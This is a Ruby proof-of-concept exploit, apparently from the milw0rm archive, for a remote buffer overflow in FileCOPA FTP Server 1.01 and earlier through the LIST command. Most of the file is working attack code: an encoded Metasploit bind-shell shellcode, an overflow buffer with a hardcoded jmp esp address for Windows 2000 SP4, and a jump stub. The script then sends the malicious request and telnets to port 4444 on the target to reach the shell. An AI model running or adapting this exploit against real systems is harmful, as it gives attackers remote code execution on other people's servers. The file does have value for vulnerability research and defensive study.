# =============================================================================================
#                    FileCOPA FTP Server <= 1.01 (LIST) Remote Buffer Overflow Exploit(2)
#                                               By Umesh Wanve
# =============================================================================================         
#
# Date : 05-04-2007
#
# Tested on Windows 2000 SP4 Server English
#           Windows 2000 SP4 Professional English
#
#   
#  We can write some assembly instruction to jump into shellcode. At the time of EIP overwrite, ECX points to our
#  hole request(LIST evil). So jumping forward into ECX points to our Shellcode. This was written coz i was learning
#  ruby
#
#  P.S. This was written for educational purpose. Use it at your own risk.Author will be not be
#  responsible for any damage.
#
#  Always Thanks to Metasploit and Stroke
#===============================================================================================

require 'net/ftp'

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
shellcode = "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7"
shellcode += "\x82\xf8\x80\x83\xeb\xfc\xe2\xf4\x0b\xe8\x13\xcd\x1f\x7b\x07\x7f"
shellcode += "\x08\xe2\x73\xec\xd3\xa6\x73\xc5\xcb\x09\x84\x85\x8f\x83\x17\x0b"
shellcode += "\xb8\x9a\x73\xdf\xd7\x83\x13\xc9\x7c\xb6\x73\x81\x19\xb3\x38\x19"
shellcode += "\x5b\x06\x38\xf4\xf0\x43\x32\x8d\xf6\x40\x13\x74\xcc\xd6\xdc\xa8"
shellcode += "\x82\x67\x73\xdf\xd3\x83\x13\xe6\x7c\x8e\xb3\x0b\xa8\x9e\xf9\x6b"
shellcode += "\xf4\xae\x73\x09\x9b\xa6\xe4\xe1\x34\xb3\x23\xe4\x7c\xc1\xc8\x0b"
shellcode += "\xb7\x8e\x73\xf0\xeb\x2f\x73\xc0\xff\xdc\x90\x0e\xb9\x8c\x14\xd0"
shellcode += "\x08\x54\x9e\xd3\x91\xea\xcb\xb2\x9f\xf5\x8b\xb2\xa8\xd6\x07\x50"
shellcode += "\x9f\x49\x15\x7c\xcc\xd2\x07\x56\xa8\x0b\x1d\xe6\x76\x6f\xf0\x82"
shellcode += "\xa2\xe8\xfa\x7f\x27\xea\x21\x89\x02\x2f\xaf\x7f\x21\xd1\xab\xd3"
shellcode += "\xa4\xd1\xbb\xd3\xb4\xd1\x07\x50\x91\xea\xe9\xdc\x91\xd1\x71\x61"
shellcode += "\x62\xea\x5c\x9a\x87\x45\xaf\x7f\x21\xe8\xe8\xd1\xa2\x7d\x28\xe8"
shellcode += "\x53\x2f\xd6\x69\xa0\x7d\x2e\xd3\xa2\x7d\x28\xe8\x12\xcb\x7e\xc9"
shellcode += "\xa0\x7d\x2e\xd0\xa3\xd6\xad\x7f\x27\x11\x90\x67\x8e\x44\x81\xd7"
shellcode += "\x08\x54\xad\x7f\x27\xe4\x92\xe4\x91\xea\x9b\xed\x7e\x67\x92\xd0"
shellcode += "\xae\xab\x34\x09\x10\xe8\xbc\x09\x15\xb3\x38\x73\x5d\x7c\xba\xad"
shellcode += "\x09\xc0\xd4\x13\x7a\xf8\xc0\x2b\x5c\x29\x90\xf2\x09\x31\xee\x7f"
shellcode += "\x82\xc6\x07\x56\xac\xd5\xaa\xd1\xa6\xd3\x92\x81\xa6\xd3\xad\xd1"
shellcode += "\x08\x52\x90\x2d\x2e\x87\x36\xd3\x08\x54\x92\x7f\x08\xb5\x07\x50"
shellcode += "\x7c\xd5\x04\x03\x33\xe6\x07\x56\xa5\x7d\x28\xe8\x07\x08\xfc\xdf"
shellcode += "\xa4\x7d\x2e\x7f\x27\x82\xf8\x80"


host="10.217.100.130"                                              #Target address  

pad ="A" * 160                                                          # Buffer
eip = "\x63\x37\x57\x7c"                                           #jmp esp from KERNEL32.DLL on Win2000 SP4 English
nop ="\x90" * 12                                                       # Nop Sled
nop1="\x90" * 4      

asm ="\x33\xc0\xb0\x10\xc1\xe0\x04\x03\xc8\xff\xe1"
# 33 c0       xor eax, eax
# b0 10       mov al,  10
# c1 e0 04   shl eax,4
# 03 c8       add ecx,eax
# ff e1        jmp ecx  

buffer ="A\x20" + pad  + eip + nop1 + asm + nop + shellcode +"\r\n"         # Our Evil Buffer

ftp = Net::FTP.new(host)

puts "++ Connecting to target...\n"

ftp.login(user="test", passwd="test")                            # User name and password
ftp.passive = true
sleep(2)

puts "++ Logging in....\n"
sleep(2)
puts "++ Building Malicious Request ....\n"

begin
   ftp.list(buffer)
rescue Net::FTPError
    $stderr.print "++ Done ...\n"
end



puts "++ Connecting to target on port 4444....\n"


command= "telnet "+ host +" 4444"

system(command)

ftp.close

# milw0rm.com [2007-04-06]